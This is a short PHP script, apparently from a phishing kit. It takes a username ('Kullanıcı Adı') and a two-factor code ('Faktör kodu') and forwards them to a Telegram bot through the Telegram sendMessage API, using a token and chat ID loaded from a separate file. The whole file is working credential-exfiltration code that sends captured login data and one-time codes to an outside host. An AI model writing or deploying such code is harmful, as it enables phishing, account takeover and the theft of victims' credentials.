<?php
include 'tokenandchatid.php';
    $data = [
        'text' => ' 
Kullanıcı Adı: '.$blind.' 

Faktör kodu : '.$fac.'

      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>